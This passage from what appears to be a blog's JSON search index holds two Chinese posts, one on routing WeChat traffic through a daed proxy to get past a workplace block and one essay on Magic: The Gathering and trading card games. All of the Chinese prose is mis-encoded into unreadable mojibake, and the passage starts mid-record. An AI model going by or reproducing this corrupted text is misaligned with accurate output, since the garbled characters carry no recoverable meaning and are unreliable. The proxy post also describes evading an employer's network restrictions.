ä½†æ˜¯å›¾ç‰‡çš„å‘é€å’Œæ¥æ”¶æœ‰æå…¶ä¸¥é‡çš„å»¶è¿Ÿ, åº”è¯¥æ˜¯èµ°äº†ä»£ç†å¯¼è‡´çš„.\né˜¶æ®µä¸‰: ä»…ä»£ç†ç™»é™†ç›¸å…³åŸŸå ç»è¿‡å‡ æ¬¡å®éªŒ, å‘é€å•ä½å¯¹å¾®ä¿¡çš„å°ç¦ä¸»è¦æœ‰ä¸¤æ–¹é¢:\nç™»é™†ç›¸å…³çš„æµé‡å°ç¦ å¾®ä¿¡å…¬ä¼—å·å›¾ç‰‡ç›¸å…³çš„æµé‡å°ç¦ é‚£ä¹ˆåœ¨æœç´¢åˆ°ç›¸å…³åŸŸååˆ—è¡¨ä¹‹å,å°†å¯¹åº”çš„åŸŸåæ·»åŠ åˆ°daedè§„åˆ™ä¸­,å…¶ä»–çš„æµé‡ä¸ä½œå¤„ç†ä½¿ç”¨ç›´è¿.\ndomain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -\u0026gt; proxy é‡æ–°åŠ è½½è§„åˆ™, ä¸€åˆ‡æ­£å¸¸.\n","permalink":"https://dragonbox.top/posts/tech-wechat-proxy/","summary":"\u003cp\u003eç›®å‰å•ä½å®æ–½äº†å¾®ä¿¡å°é”,æœ¬æ–‡æ—¨åœ¨è®°å½•ç»•è¿‡å°é”çš„è¿‡ç¨‹.\u003c/p\u003e\n\u003ch2 id=\"é˜¶æ®µä¸€-æŠ“åŸŸå\"\u003eé˜¶æ®µä¸€: æŠ“åŸŸå\u003c/h2\u003e\n\u003cp\u003eä½¿ç”¨äº†\u003ccode\u003etcpdump\u003c/code\u003eæŠ“å–å„ä¸ªdnsè¯·æ±‚, æ¥è·å–éœ€è¦ä»£ç†çš„åŸŸååˆ—è¡¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tcpdump -i any -n -s \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e port \u003cspan style=\"color:#ae81ff\"\u003e53\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½†æ˜¯æŠ“åˆ°åŸŸåååŠ å…¥daedçš„ä»£ç†åˆ—è¡¨ä¸­è¿˜æ˜¯æ— æ³•ç™»é™†,æ€€ç–‘æ˜¯æ²¡æŠ“å…¨.\u003c/p\u003e\n\u003ch2 id=\"é˜¶æ®µäºŒ-è¿›ç¨‹ä»£ç†\"\u003eé˜¶æ®µäºŒ: è¿›ç¨‹ä»£ç†\u003c/h2\u003e\n\u003cp\u003eæ—¢ç„¶æŠ“ä¸å…¨, é‚£ä¹ˆå°±å¯¹æ•´ä¸ªå¾®ä¿¡çš„è¿›ç¨‹è¿›è¡Œæµé‡ä»£ç†å§, åœ¨daedä¸­æ·»åŠ è§„åˆ™:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epname(WeChatAppEx) -\u0026gt; proxy\npname(wechat) -\u0026gt; proxy\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™ä¸‹ç™»é™†å’Œå‘æ–‡å­—æ¶ˆæ¯éƒ½æ­£å¸¸äº†, ä½†æ˜¯å›¾ç‰‡çš„å‘é€å’Œæ¥æ”¶æœ‰æå…¶ä¸¥é‡çš„å»¶è¿Ÿ, åº”è¯¥æ˜¯èµ°äº†ä»£ç†å¯¼è‡´çš„.\u003c/p\u003e\n\u003ch2 id=\"é˜¶æ®µä¸‰-ä»…ä»£ç†ç™»é™†ç›¸å…³åŸŸå\"\u003eé˜¶æ®µä¸‰: ä»…ä»£ç†ç™»é™†ç›¸å…³åŸŸå\u003c/h2\u003e\n\u003cp\u003eç»è¿‡å‡ æ¬¡å®éªŒ, å‘é€å•ä½å¯¹å¾®ä¿¡çš„å°ç¦ä¸»è¦æœ‰ä¸¤æ–¹é¢:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eç™»é™†ç›¸å…³çš„æµé‡å°ç¦\u003c/li\u003e\n\u003cli\u003eå¾®ä¿¡å…¬ä¼—å·å›¾ç‰‡ç›¸å…³çš„æµé‡å°ç¦\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eé‚£ä¹ˆåœ¨æœç´¢åˆ°\u003ca href=\"https://www.fdeer.com/4817.html\"\u003eç›¸å…³åŸŸååˆ—è¡¨\u003c/a\u003eä¹‹å,å°†å¯¹åº”çš„åŸŸåæ·»åŠ åˆ°daedè§„åˆ™ä¸­,å…¶ä»–çš„æµé‡ä¸ä½œå¤„ç†ä½¿ç”¨ç›´è¿.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edomain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -\u0026gt; proxy\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eé‡æ–°åŠ è½½è§„åˆ™, ä¸€åˆ‡æ­£å¸¸.\u003c/p\u003e","title":"ç‰¹æ®Šç½‘ç»œç¯å¢ƒä¸‹çš„å¾®ä¿¡ä»£ç†"},{"content":"è¿™å‡ å¤©è¢«ä¸‡æ™ºç‰Œæ‰€å¸å¼•, å¯Œæœ‰å²è¯—æ„Ÿçš„ç”»é£, å¤æ‚ä½†ä¸æ··ä¹±çš„è§„åˆ™, ç®€æ´çš„å¡é¢è¯­è¨€, ä¸°å¯Œçš„å¡ç‰‡ç§ç±», å¤šæ ·æ€§çš„ç©æ³•\u0026hellip;\u0026hellip;è¿™äº›éƒ½æ˜¯æˆ‘åœ¨æ¸¸æˆç‹ä¸­æ‰€æ¥è§¦ä¸åˆ°ä½†æ€€å¿µè®¸ä¹…çš„, åœ¨æ¥è§¦ä¸‡æ™ºç‰Œä¹‹å‰,è¿™ç§æ€€å¿µæºè‡ªäºè¿‡å»çš„ç‚‰çŸ³ä¼ è¯´,è€Œåœ¨äº†è§£åˆ°ä¸‡æ™ºç‰Œåæ‰å‘ç°,è¿™äº›ç‰¹è´¨å…¶å®æ˜¯ä¸‡æ™ºç‰Œæ‰€åˆ›é€ è€Œè®©ç‚‰çŸ³ç»§æ‰¿ä¸‹æ¥çš„, å†åŠ ä¸Šç•¥å€¾å‘äºé»‘æš—å²è¯—çš„ç”»é£, ä¸‡æ™ºç‰Œåœ¨å¾ˆå¤šç»´åº¦ä¸Šéƒ½æ¯”è¿‡å»æ¥è§¦è¿‡çš„æ‰€æœ‰å¡ç‰Œæ¸¸æˆæ›´æˆ³æˆ‘çš„xp.\nå½“ç„¶, å®ƒå¹¶ä¸æ˜¯æ²¡æœ‰ç¼ºç‚¹çš„, è™½ç„¶ä¸»è¦çš„å‡ ä¸ªç¼ºç‚¹éƒ½ä¸æ˜¯å¡ç‰Œæœ¬èº«å¸¦æ¥çš„.\næœ€å¤§çš„ç¼ºç‚¹å…¶å®åœ¨äºå¨ä¸–æ™ºçš„è¿è¥å¤ªåƒåœ¾äº† ç¼ºä¹æ¨å¹¿, å›½å†…çš„æ¨å¹¿åŠ›åº¦ç›¸æ¯”è¾ƒå®å¯æ¢¦æ¥è¯´å‡ ä¹ä¸º0, æˆ‘ç›®å‰èƒ½çœ‹åˆ°çš„æœ€è¿‘çš„ä¸€æ¬¡æ¨å¹¿è¿˜æ˜¯åœ¨2021å¹´, æ‰¾çš„ç”šè‡³è¿˜æ˜¯åŠä½›è€Œä¸æ˜¯æ­£å„¿å…«ç»çš„æ˜æ˜Ÿ å®˜æ–¹å¯¹æ°‘é—´èµ›äº‹çš„æŠµåˆ¶æ€åº¦è®©\u0026quot;ç§¯æç»„ç»‡-\u0026gt;ç§¯æé˜»æ­¢\u0026quot;æˆä¸ºå¤§é™†ä¸‡æ™ºç‰Œç©å®¶å£å£ç›¸ä¼ çš„é»‘å†å², å¤±å»äº†æ°‘å¿ƒ å–æ¶ˆä¸­æ–‡çº¿ä¸ä»…å¦¨ç¢çš„æ–°äººå…¥å‘, ä¹Ÿè®©è€ç©å®¶å¯¹ä¹°å¡çš„æŠ•èµ„ä»·å€¼äº§ç”Ÿäº†æ€€ç–‘, ç»§è€Œæ¨åŠ¨è¿™ä¸¤ç±»äººå»æŠ•èµ„å…¶ä»–å‘å±•æ›´æœ‰å‰æ™¯çš„å¡ç‰Œ ä¸‡æ™ºç‰Œçš„å®šä»·, å››ç¾å…ƒåäº”æŠ½çš„å…¨çƒç»Ÿä¸€å®šä»·åœ¨ä¸‰åå¹´çš„ä¸‡æ™ºç‰Œå†å²ä¸­å°±æ²¡æœ‰å˜è¿‡, å¯å³ä¾¿åœ¨æ¶ˆè´¹æ°´å¹³è¿œèƒœè¿‡å»çš„ç°åœ¨, è¿™ä¸ªä»·æ ¼åœ¨å¤§éƒ¨åˆ†äºº, å°¤å…¶æ˜¯åœˆå¤–ç©å®¶çœ‹æ¥ä¾æ—§åé«˜, å†åŠ ä¸Šè‡³å°‘60ç‰Œçš„æ„ç­‘ä½“é‡å’ŒäºŒçº§å¸‚åœºäº¤æ˜“, è®©æˆå‹ä¸‡æ™ºå¥—ç‰Œçš„ä»·æ ¼æ™®éåœ¨500+, ä¸ä¹‹å½¢æˆé²œæ˜å¯¹æ¯”çš„, æ˜¯å®å¯æ¢¦å’Œæ¸¸æˆç‹ç­‰TCGåè¾ˆä»¬æ›´åŠ äº²æ°‘çš„ä»·æ ¼, è®©ä¸‡æ™ºç‰Œæ˜¾å¾—åƒæ˜¯ä¸€ä¸ªè·Ÿä¸ä¸Šæ—¶ä»£çš„è€äºº. å½“ç„¶äº†, å°±æˆ‘ä¸ªäººè€Œè¨€, ä¸‡æ™ºç‰Œçš„è®¾è®¡æ„Ÿå€¼å¾—è®©å®ƒçš„ä»·æ ¼æ¯”åˆ«çš„å¡ç‰Œè´µ, è™½ç„¶æˆ‘ä¸ä¼šä¹° èƒŒæ™¯æ•…äº‹è´¨é‡ä¸é«˜. äººç±»æ˜¯ä¸€ä¸ªä»¥è®²æ•…äº‹èµ·å®¶çš„ç‰©ç§, äººç±»ç¤¾ä¼šä¹Ÿæ˜¯åœ¨é‡‘é’±æ”¿æ²»å›½å®¶å®—æ•™ç­‰ç§ç§æŠ½è±¡æ•…äº‹åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„, å¯ä»¥è¯´æ²¡æœ‰æ•…äº‹å°±æ²¡æœ‰ç¤¾ç¾¤. ä¸‡æ™ºç‰Œä¸æ˜¯æ²¡æœ‰æ•…äº‹, è€Œæ˜¯å®ƒçš„æ•…äº‹å¤ªè¿‡å•è–„ä¸”æ²¡æœ‰å¸å¼•äººçš„åœ°æ–¹, åœ¨è¿™ä¸ªæ•…äº‹éåœ°èµ°çš„å¹´ä»£, éšä¾¿ä¸€æœ¬ä¸»æµçš„å†’é™©å°è¯´éƒ½å¯ä»¥æ‹‰å‡ºæ¥åŠæ‰“å®ƒ, è€Œä¸å¤Ÿç²¾å½©çš„æ•…äº‹å°±æ³¨å®šæ— æ³•å¸å¼•æ³¨é‡æ•…äº‹çš„äºº ç¼ºä¹æ•…äº‹çš„ä¼ æ’­åª’ä»‹. å®¢è§‚æ¥è¯´, æ¸¸æˆç‹å’Œå®å¯æ¢¦çš„èƒŒæ™¯æ•…äº‹æ”¾åœ¨ç°åœ¨æ¥çœ‹åŒæ ·æ°´å¹³ä¸€èˆ¬, å‡å¦‚å¤§å®¶çš„æ•…äº‹å½¢å¼éƒ½åªæ˜¯å°è¯´, æˆ‘ç›¸ä¿¡ä¸‡æ™ºç‰Œåœ¨è®²æ•…äº‹è¿™æ–¹é¢æˆ–è®¸è¿˜æœ‰ä¸€æˆ˜ä¹‹åŠ›, ä½†æ˜¯æ¸¸æˆç‹å’Œå®å¯æ¢¦æœ‰äº†åŠ¨ç”», ç«äº‰çš„ç»´åº¦å°±å˜å¾—ä¸ä¸€æ ·äº†, åœ¨å¤„ç†å¾—å½“çš„æƒ…å†µä¸‹, è§†é¢‘å½±åƒä¼šå¤§å¹…åº¦æé«˜ä¸€ä¸ªæ•…äº‹æƒ…æ„Ÿæ¸²æŸ“çš„ä¸Šä¸‹é™, å³ä¾¿å‰§æƒ…å†æ€ä¹ˆç³Ÿç³•, äººä»¬ä¹Ÿä¼šå› ä¸ºé‚£ä¹ˆå‡ ä¸ªå°è±¡æ·±åˆ»çš„ç”»é¢è€Œè®°ä½è¿™ä¸ªIP, éšç€æ—¶é—´çš„æ¨ç§», åŠ¨ç”»å¸¦æ¥çš„ä¼ æ’­æ•ˆåº”ä¼šå‘ˆç°æ»šé›ªçƒå¼çš„å¢åŠ : è€ç©å®¶ä¼šå› ä¸ºè·å¾—æ»¤é•œåŠ æŒ, æ–°ç©å®¶åŒæ ·å¯ä»¥è½»æ¾å› ä¸ºç”»é¢è€Œå‘ç”Ÿå…±æƒ…. å‰©ä¸‹çš„æ¶‰åŠå¡ç‰Œå¹³è¡¡æ€§çš„ç¼ºç‚¹, è¿™ä¹Ÿå¼•å‘äº†æˆ‘å¯¹ä¼—å¤šTCGæ¸¸æˆçš„æ€è€ƒ, åŒ…æ‹¬æ¸¸æˆæ•´ä½“çš„ç”Ÿå‘½å‘¨æœŸä»¥åŠTCGæ¸¸æˆçš„æ„ä¹‰.\nç”Ÿå‘½å‘¨æœŸ å®ä½“è‹¦å„ çºµè§‚ä¼—å¤šTCG, ä¸‡æ™ºç‰Œå—é™äºåº•å±‚è´¹ç”¨æœºåˆ¶ä¼¼ä¹åœ¨è¿™æ–¹é¢ç›¸å¯¹æ¥è¯´åšå¾—å¥½ä¸€äº›, ç„¶è€Œé—®é¢˜åœ¨äº, ä½œä¸ºä¸€ä¸ªå•†ä¸šäº§å“, å®ƒçš„ç¬¬ä¸€ä»»åŠ¡æ˜¯ç»™å…¬å¸å¸¦æ¥è´¢å¯Œ, ç¬¬äºŒä»»åŠ¡æ‰æ˜¯æœåŠ¡äºç©å®¶, å°½ç®¡äºŒè€…åœ¨æœ‰äº›æ—¶å€™, å°¤å…¶æ˜¯æ¸¸æˆå‘å±•çš„æ—©æœŸæ˜¯ä¸å†²çªçš„. ä»ç©å®¶æ¥è¯´, æ¸¸æˆæœ¬ä½“çš„è¿è¥å‘å±•å­˜åœ¨ä¸¤ä¸ªæ–¹å‘, ä¸€æ˜¯ç©æ³•çš„æ‰©å¼ , äºŒæ˜¯å¼ºåº¦çš„è¿­ä»£, å‰è€…æ›´çµå·§æ›´å¾—äººå¿ƒ, åè€…åˆ™ç”±äºå¯¹å·²æœ‰å¡ç‰Œçš„æ·˜æ±°è€Œå¸¸å¸¸å¤‡å—äº‰è®®. ä¸€èˆ¬æ¥è¯´, æœ‰ç»éªŒçš„å¡ç‰Œè¿è¥å•†å¹¶ä¸ç€æ€¥äºå¼ºåº¦è¿­ä»£, è€Œæ˜¯ä¼˜å…ˆè‡´åŠ›äºç©æ³•çš„æ‰©å¼ , é—´æˆ–å¤¹æ‚å¿…è¦çš„å¼ºåº¦æå‡, å¯æƒœçš„æ˜¯, è¿‘ä¹å›ºåŒ–çš„åº•å±‚è§„åˆ™æ¡†æ¶å†³å®šäº†ç©æ³•çš„æ‰©å¼ æ˜¯æœ‰è¾¹é™…æ•ˆåº”çš„, å½“æ‰©å¼ ç©æ³•çš„è¾¹é™…æ•ˆåº”å˜å¾—è¶Šæ¥è¶Šä½æ—¶, è¯´æ˜TCGçš„ç”Ÿå‘½å‘¨æœŸå·²ç»æ­¥å…¥äº†ååŠæ®µ, ç„¶è€Œè¿™ä¸å•†ä¸šäº§å“çš„ç¬¬ä¸€ä½¿å‘½ç›¸äº’å†²çª, éšä¹‹è€Œæ¥çš„æ˜¯å¼ºåº¦çš„æ— é™æ‰©å¼ å’Œäº‰è®®çš„å‘ç”Ÿ, åœ¨æ²¡æœ‰æ–°ç©æ³•çš„æƒ…å†µä¸‹, å¯ä»¥é¢„è§çš„æ˜¯æ— æ­¢å¢ƒçš„å¼ºåº¦çˆ†ç‚¸. åœ¨è¿™ç‚¹ä¸Š, æ‰€æœ‰å•†ä¸šTCGéƒ½é¢ä¸´ç€åŒæ ·çš„é—®é¢˜: æœ‰é™çš„å¡ç‰Œç©æ³•å’Œæ— é™çš„å…¬å¸è´ªæ¬²ä¸ç©å®¶éœ€æ±‚å¼•å‘çš„ä¸»è¦çŸ›ç›¾.\nå½“ç„¶, å°±æˆ‘æœ‰é™çš„äº†è§£æ¥çœ‹, ä¸‡æ™ºç‰Œè¿™ä¸¤å¹´ä¾æ—§åœ¨è¿›è¡Œç€å¤§å¤§å°å°çš„æœºåˆ¶åˆ›æ–°, ç„¶è€Œçœ‹èµ·æ¥, å¼ºåº¦çˆ†ç‚¸æ˜¯æ¯ä¸ªTCGä¸å¯é¿å…çš„ç»“å±€, è¿™æ˜¯æ¯ä¸€ä¸ªåœˆå†…ç©å®¶éƒ½ä¸æ„¿æ„çœ‹åˆ°çš„ç»“æœ. é‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•æ‰“ç ´è¿™ä¸ªåƒµå±€å‘¢? æœ‰çš„, åªè¦çŸ›ç›¾çš„ä¸‰æ–¹æœ‰ä¸€æ–¹æ­»å», åƒµå±€å°±ä¼šä¸æˆç«‹\næ— é™æ‰©å±•å¡ç‰Œçš„ç©æ³•ä¸è§„åˆ™. æŒ‰ç…§å‰æ–‡æ‰€æ, ç©æ³•çš„æ‰©å¼ èƒ½å¤Ÿç¼“å’ŒTCGçš„ä¸»è¦çŸ›ç›¾, åœ¨ç©æ³•å­˜åœ¨æ— é™å¯èƒ½çš„æƒ…å†µä¸‹, çŸ›ç›¾èƒ½å¤Ÿè¢«ç¨€é‡Šè‡³ä¸å­˜åœ¨. ç„¶è€ŒåŸºæœ¬æ²¡æœ‰å®ä½“æ¸¸æˆèƒ½å¤Ÿåšåˆ°è¿™ç‚¹, ä¸ºä»€ä¹ˆè¯´å®ä½“æ¸¸æˆ, åé¢ä¼šè®²åˆ°. å…¬å¸çš„æ­»äº¡. è¿™æ˜¯ä¸€ä¸ªå¾ˆéš¾ä½†æ˜¯æœ‰å¯èƒ½å‘ç”Ÿçš„æƒ…å†µ, åœ¨è¿™ç§æƒ…å†µä¸‹, å¡ç‰Œç¯å¢ƒå°†ä¼šå¾—åˆ°æ°¸ä¹…æ€§çš„å›ºåŒ–, ç©å®¶ä»¬å°†ä¼šä»ç°æœ‰çš„å¡ç‰‡ä¸­å»ºç«‹æ–°çš„å¹³è¡¡, åŒ…æ‹¬ä¸åŒçš„èµ›åˆ¶å’Œç¦å¡è¡¨, å„ç§å¥—ç‰Œçš„å¼ºåº¦åˆ†çº§. ç©å®¶éœ€æ±‚ä¸å†æ‰©å¼ , ä¸å†å¯¹å¼ºåº¦å’Œç©æ³•æŠ±æœ‰æ›´é«˜çš„è¦æ±‚, è¿™ä¸å¯èƒ½. å°±æˆ‘ä¸ªäººæ¥è¯´, ç¬¬äºŒç§å¯èƒ½æ˜¯æˆ‘æ‰€æœŸæœ›å‘ç”Ÿçš„, å³ä¾¿è¿™ä¼šå¸¦æ¥ä¸€ç³»åˆ—ä¸¥é‡é—®é¢˜\nç»ˆç»“å•†ä¸šé“¾ä¸Šçš„å„ä¸ªä¸Šä¸‹æ¸¸çš„ç”Ÿå‘½, å¯¹äºå»ç‰Œåº—çš„ç›¸å…³ç©å®¶æ¥è¯´, ç›´è§‚çš„ä½“éªŒä¸ä»…æ˜¯ä¹°ä¸åˆ°å¯¹åº”å¡ç‰Œ, æ›´æœ‰å¯èƒ½ä¼šå› ä¸ºç‰Œåº—çš„å•†ä¸šè€ƒè™‘è€Œè¢«é©±é€. ä¸è¿‡ä»¥æˆ‘ä¸ªäººçš„ä½“éªŒæ¥çœ‹, å»ç‰Œåº—é‡åˆ°æœ‰è¶£ä¹‹äººçš„æ¦‚ç‡å¤ªä½äº†, æˆ‘å®å¯å’Œæœ‹å‹çº¿ä¸Šè§†é¢‘ç© éƒ¨åˆ†ç©å®¶ä¼šå› ä¸ºç¯å¢ƒå›ºåŒ–è€Œé€€å‘, æ¯•ç«Ÿäººæ˜¯å–œæ–°åŒæ—§çš„åŠ¨ç‰©, è¿™ç§å¤©æ€§ä¿ƒæˆæˆ‘ä»¬è¿›è¡Œå†’é™©å’Œå‡ºè½¨, ç„¶è€Œå°±ä¸‡æ™ºç‰Œæ¥è¯´, ç»ˆç©¶ä¼šæœ‰å¤§æ‰¹ç©å®¶ç•™å­˜, å› ä¸ºå®ƒå®åœ¨æ˜¯å¤ªç‰¹åˆ«äº†. å®˜æ–¹åœæ­¢å°åˆ·å, å¡ç‰Œçš„æ¥æºæˆä¸ºä¸¥é‡é—®é¢˜, è¿™ç‚¹æˆ‘å¹¶ä¸æ‹…å¿ƒ, ç›¸å…³æ‰“å°è¡Œä¸šå’Œæ°‘é—´ç»„ç»‡å°†ä¼šéšç€å®˜æ–¹å…¬å¸çš„æ­»äº¡è€Œå…´èµ·. æ­»äº¡å¸¦æ¥æ–°ç”Ÿ.\nç”µå­é£å‡ ç‚‰çŸ³ä¼ è¯´æ˜¯ä¸€ä¸ªå¾ˆç‰¹åˆ«çš„å¡ç‰Œæ¸¸æˆ, ç”±äºæ²¡æœ‰å®ä½“, å®ƒç¼ºä¹é›†æ¢çš„å±æ€§, å¹¶ä¸å±äºTCG, è€Œè¿™ç§å…¨é¢ç”µå­åŒ–å¸¦æ¥çš„å¥½å¤„æ˜¯æ˜¾è€Œæ˜“è§çš„: æ— éœ€é¡¾è™‘å®ä½“å¡ç‰Œ, å¯ä»¥ç”¨ç¨‹åºå»å®ç°é‚£äº›çº¿ä¸‹å¡ç‰Œè¾¾æˆä¸äº†çš„æ•ˆæœ, ä¾‹å¦‚åœ¨å…¨éƒ¨çš„ä¼ è¯´éšä»ä¸­éšæœºæ‘‡å‡ºä¸€ä¸ª, ä¹Ÿèƒ½å®ç°çº¿ä¸‹å¡ç‰Œå—é™äºç‰©ç†ç¯å¢ƒæ— æ³•å®ç°çš„æœºåˆ¶, è¿™å¤§å¤§æ‹“å±•äº†å¡ç‰Œæ¸¸æˆçš„å¯èƒ½æ€§.\nå½“ç„¶, åå¤„ä¹Ÿæœ‰, ç¬¬ä¸€, ç©å®¶æ— æ³•æç€å–œæ¬¢çš„å®ä½“å¡ç‰Œè¿›è¡Œæˆ˜æ–—, ç›¸ä¿¡æˆ‘, æç€å¡æ‰“çš„æ„Ÿè§‰å’Œçº¿ä¸Šç‚¹ç‚¹é¼ æ ‡çš„æ„Ÿè§‰å¾ˆä¸ä¸€æ ·, è¿™æ˜¯ç”µå­æ¸¸æˆæ— æ³•æ›¿ä»£çš„ä¸€ç‚¹; ç¬¬äºŒ, æ‰€æœ‰æ•°æ®å½’èƒŒåçš„å…¬å¸æ‰€æœ‰, å¡ç‰Œæ— æ³•è„±ç¦»å…¬å¸å­˜åœ¨, å½“ç„¶, ç©ä¸€å¤©æ˜¯ä¸€å¤©æ˜¯å¾ˆå¤šäººçš„æƒ³æ³•, æš´é›ªç¦»å¼€ä¸­å›½çš„é‚£æ®µæ—¶é—´ä¹Ÿå¹¶æ²¡æœ‰æ€ä¹ˆæ ·, å¯ä»¥ç©çš„æ¸¸æˆä¸€æŠ“ä¸€å¤§æŠŠ.\næ„ä¹‰å’Œé„™è§†é“¾ æ£‹ç‰Œç­–ç•¥ç±»æ¸¸æˆä½œä¸ºä¼—å¤šæ¸¸æˆä¸­å¯¹æ™ºåŠ›æ°´å¹³è¦æ±‚æœ€é«˜çš„æ¸¸æˆ, å…¶æ¸¸ç©è¿‡ç¨‹éå¸¸å¼ºè°ƒä¸ªäººæ€è€ƒ, åœ¨è¿™æ ·ä¸€ä¸ªå´‡å°šæ™ºåŠ›çš„æ—¶ä»£, æ­¤ç±»æ¸¸æˆæ— ç–‘åœ¨è®¸å¤šç©å®¶å¿ƒä¸­äº«æœ‰å‡ åˆ†å°Šè´µåœ°ä½, è€Œå¡ç‰Œç±»æ¸¸æˆ, å°¤å…¶æ˜¯TCG, ç”±äºç‹¬ç‰¹çš„ç†å¿µ, æ›´æ˜¯ä¸ºè®¸å¤šç©å®¶æ‰€æ´¥æ´¥ä¹é“. ä¸æ‰€æœ‰æ¸¸æˆä¸€æ ·, TCGä¹Ÿè¦è¢«æ”¾åœ¨é„™è§†é“¾ä¸Šå¥½å¥½è¯„ä»·ä¸€ç•ª, TCGå†…éƒ¨ä¹Ÿå­˜åœ¨åŸºäºéš¾åº¦å’Œè®¾è®¡è´¨é‡è€Œè¯ç”Ÿçš„é„™è§†é“¾, ä¸è¿‡è¿™é‡Œå°±å­˜åœ¨ç€ä¸€ä¸ªæœ‰æ„æ€çš„é—®é¢˜: é—¨æ§›è¶Šé«˜è¶Šå¤æ‚çš„æ¸¸æˆçœŸçš„è¶Šå¥½å—?\nè¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜, æ¨å¹¿å¼€æ¥, åŸºäºéš¾åº¦å’Œæ™ºåŠ›æŒ‘æˆ˜æˆ–è€…æ¸¸æˆæŠ€æœ¯åŠ›çš„é„™è§†é“¾å­˜åœ¨å·²ä¹…, å¾˜å¾Šåœ¨è®¸å¤šç©å®¶çš„å¿ƒé‡Œ, ä¸ªåˆ«æç«¯è€…ç”šè‡³ä¼šä»¥æ­¤ä¸ºåœ­è‡¬æˆä¸ºç±»ä¼¼å®—æ•™çš„ç»„ç»‡å¹¶å¯¹å…¶ä»–æ¸¸æˆç©å®¶å¤§åŠ è®¨ä¼, å¸Œæœ›å…¶ä»–æ¸¸æˆ\u0026quot;æ¶ˆå¤±\u0026quot;, è®©é„™è§†é“¾ä¸Šè‡ªå·±è®¤å¯çš„æ¸¸æˆç»™å¤§å®¶å¸¦æ¥è‡ªå·±è®¤å¯çš„æŒ‘æˆ˜å’Œéš¾åº¦è€ƒéªŒ.\nç„¶è€Œè¿™ç§é„™è§†æ˜¯å¯ç¬‘çš„, å¦‚æœè¿½æ±‚éš¾åº¦å’ŒæŒ‘æˆ˜, é‚£ä¹ˆå°±ä¸è¯¥ç©æ¸¸æˆ, æ— è®ºç¼–ç¨‹è¿˜æ˜¯è¿åŠ¨, å“ªä¸€ä¸ªéš¾åº¦ä¸æ¯”ç°æœ‰çš„ä»»ä½•æ¸¸æˆéƒ½å›°éš¾? å¦‚æœè¿½æ±‚æè‡´çš„å›°éš¾, é‚£ä¹ˆç°åœ¨å°±åº”è¯¥æ”¾ä¸‹æ¸¸æˆ, å»å­¦ä¹ ä½ æœ€ä¸æƒ³å­¦çš„åŠŸè¯¾, å»ç»è¥å¥½ä½ é‚£æƒ¨æ·¡ä¸å ªçš„äººç”Ÿ.\nè¯´ç©¿äº†, ç©æ¸¸æˆç©æ¥ç©å», ç©çš„å°±æ˜¯ä¸€ä¸ªå¿«ä¹, è°ä¹Ÿåˆ«ç§ä¸èµ·è°.\næœ€åçš„æœ€å è¯´äº†è¿™ä¹ˆå¤š, ä½†æ˜¯è¿™äº›éƒ½ä¸é‡è¦, æ— è®ºæ¸¸æˆæœºåˆ¶è¿˜æ˜¯ç”»é£, å®å¯æ¢¦å’Œæ¸¸æˆç‹éƒ½ä¸æ˜¯ä¸‡æ™ºç‰Œçš„å¯¹æ‰‹, æ¸¸æˆç‹çš„æœºåˆ¶å’Œç‹¬å®¶kè¯­è¨€æ›´æ˜¯æ— æ¯”æ‰­æ›²çš„äº§ç‰©, ç„¶è€Œäººå®¶ä¾æ—§æ´»å¾—å¥½å¥½çš„, è¯´æ˜æˆ‘ä»¬äººç±»å¯¹äºå¡ç‰Œæ¡Œæ¸¸è®¾è®¡çš„å®¹å¿åŒºé—´è¿˜æ˜¯æŒºå¤§çš„. ä¸è¿‡æˆ‘æƒ³æ›´æœ‰å¯èƒ½çš„æ˜¯, æœ‰çš„æ—¶å€™, æˆ‘ä»¬æ›´åœ¨ä¹çš„ååœ¨å¯¹é¢ä¸€èµ·ç©çš„äºº, æ¯•ç«Ÿæœ‰äººæ‰æ˜¯ç©æ¸¸æˆæœ€å¤§çš„éœ€æ±‚å•Š.\n","permalink":"https://dragonbox.top/posts/gossip-tcg/","summary":"\u003cp\u003eè¿™å‡ å¤©è¢«ä¸‡æ™ºç‰Œæ‰€å¸å¼•, å¯Œæœ‰å²è¯—æ„Ÿçš„ç”»é£, å¤æ‚ä½†ä¸æ··ä¹±çš„è§„åˆ™, ç®€æ´çš„å¡é¢è¯­è¨€, ä¸°å¯Œçš„å¡ç‰‡ç§ç±», å¤šæ ·æ€§çš„ç©æ³•\u0026hellip;\u0026hellip;è¿™äº›éƒ½æ˜¯æˆ‘åœ¨æ¸¸æˆç‹ä¸­æ‰€æ¥è§¦ä¸åˆ°ä½†æ€€å¿µè®¸ä¹…çš„, åœ¨æ¥è§¦ä¸‡æ™ºç‰Œä¹‹å‰,è¿™ç§æ€€å¿µæºè‡ªäºè¿‡å»çš„ç‚‰çŸ³ä¼ è¯´,è€Œåœ¨äº†è§£åˆ°ä¸‡æ™ºç‰Œåæ‰å‘ç°,è¿™äº›ç‰¹è´¨å…¶å®æ˜¯ä¸‡æ™ºç‰Œæ‰€åˆ›é€ è€Œè®©ç‚‰çŸ³ç»§æ‰¿ä¸‹æ¥çš„, å†åŠ ä¸Šç•¥å€¾å‘äºé»‘æš—å²è¯—çš„ç”»é£, 